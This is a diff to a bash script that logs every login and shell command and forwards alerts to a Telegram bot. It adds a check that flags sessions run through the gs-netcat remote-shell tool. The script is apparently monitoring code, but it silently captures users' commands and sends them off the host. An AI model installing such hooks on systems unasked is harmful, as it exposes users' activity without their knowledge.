@@ -11,7 +11,6 @@ SESSION_LOG="$LOG_DIR/session_$(date +%Y%m%d_%H%M%S).log"
 send_telegram() {
     local message="$1"
     [ "$TELEGRAM_ENABLED" != "true" ] && return 0
-
     curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
         -H "Content-Type: application/json" \
         -d "{\"chat_id\":\"$TELEGRAM_CHAT_ID\",\"text\":\"$message\",\"parse_mode\":\"HTML\"}" \
@@ -22,9 +21,10 @@ track_login() {
     local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
     local user=$(whoami)
     local host=$(hostname)
-    local ip=$(who am i 2>/dev/null | awk '{print $NF}' | tr -d '()' || echo "local")
+    local ip=$(who am i 2>/dev/null | awk '{print $NF}' | tr -d '()' || echo "unknown")
     local session_type="LOCAL"
     [ -n "$SSH_CONNECTION" ] && session_type="SSH"
+    [ -n "$GS_NETCAT" ] && session_type="GS-NETCAT"
 
     echo "[$timestamp] 🔐 LOGIN - User:$user Host:$host IP:$ip Type:$session_type" >> "$ACTIVITY_LOG" 2>/dev/null
 
@@ -44,8 +44,7 @@ track_command() {
     echo "[$timestamp] 💻 CMD - User:$user PWD:$pwd CMD:$cmd Exit:$exit_code" >> "$ACTIVITY_LOG" 2>/dev/null
     echo "[$timestamp] CMD: $cmd (exit: $exit_code)" >> "$SESSION_LOG" 2>/dev/null
 
-    # Notifikasi untuk command penting
-    local important_cmds=("nano" "vim" "vi" "rm" "mv" "cp" "sudo" "apt" "yum" "pip" "python" "bash" "sh" "systemctl" "service" "reboot" "shutdown")
+    local important_cmds=("nano" "vim" "vi" "rm" "mv" "cp" "sudo" "apt" "yum" "pip" "python" "bash" "sh" "systemctl" "service" "reboot" "shutdown" "kill")
     local send_notif=false
 
     for important in "${important_cmds[@]}"; do
@@ -76,7 +75,6 @@ track_logout() {
     send_telegram "$msg" 2>/dev/null
 }
 
-# ----- SETUP -----
 set -o history 2>/dev/null
 HISTFILE=~/.bash_history 2>/dev/null
 HISTSIZE=1000 2>/dev/null
@@ -84,4 +82,3 @@ HISTFILESIZE=2000 2>/dev/null
 
 PROMPT_COMMAND="track_command"
 trap track_logout EXIT 2>/dev/null
-track_login 2>/dev/null
